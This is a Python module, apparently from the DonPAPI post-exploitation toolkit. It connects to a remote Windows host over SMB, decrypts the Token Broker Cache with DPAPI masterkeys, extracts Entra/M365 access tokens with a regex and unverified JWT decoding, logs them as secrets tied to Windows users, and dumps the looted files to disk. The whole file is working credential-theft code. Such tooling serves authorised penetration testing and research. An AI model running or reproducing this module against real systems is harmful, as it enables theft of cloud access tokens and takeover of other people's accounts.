import base64
import json
import re
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.wam import WamTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


def decode_token_payload(access_token: str) -> dict:
    # Try PyJWT first (jwt.decode with options={"verify_signature": False}).
    # NOTE: pyproject used to declare the wrong `jwt` package instead of
    # `PyJWT`. That package has no top-level `decode`, which caused
    # "module 'jwt' has no attribute 'decode'". Fall back to a manual
    # base64url decode so the collector keeps working regardless of
    # which package is installed. Signature is intentionally not verified;
    # we only need readable claims such as preferred_username.
    try:
        import jwt as jwt_lib
        decode = getattr(jwt_lib, "decode", None)
        if callable(decode):
            try:
                payload = decode(access_token, options={"verify_signature": False})
                if isinstance(payload, dict):
                    return payload
            except Exception:
                pass
    except ImportError:
        pass
    parts = access_token.split(".")
    if len(parts) < 2:
        return {}
    payload_b64 = parts[1]
    payload_b64 += "=" * (-len(payload_b64) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(payload_b64).decode("utf-8"))
    except Exception:
        return {}


class Wam:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping Token Broker Cache")

        def token_callback(token):
            for attrib in token.attribs:
                if attrib["Key"].decode() == "WTRes_Token":
                # Extract every access token
                    for access_token in re.findall(r"e[yw][A-Za-z0-9-_]+\.(?:e[yw][A-Za-z0-9-_]+)?\.[A-Za-z0-9-_]{2,}(?:(?:\.[A-Za-z0-9-_]{2,}){2})?", attrib.__str__()):
                        try:
                            decoded_token = decode_token_payload(access_token)
                        except Exception as e:
                            self.logger.debug(f"Skipping undecodable token: {e}")
                            continue
                        if "preferred_username" in decoded_token:
                            # Assuming that if there is no preferred_username key, this is not a valid Entra/M365 Access Token
                            self.logger.secret(f"[{token.winuser}] {decoded_token['preferred_username']}: {access_token}", )

        wam_triage = WamTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_token_callback=token_callback)
        wam_triage.triage_wam()
        dump_looted_files_to_disk(self.context.target_output_dir, wam_triage.looted_files)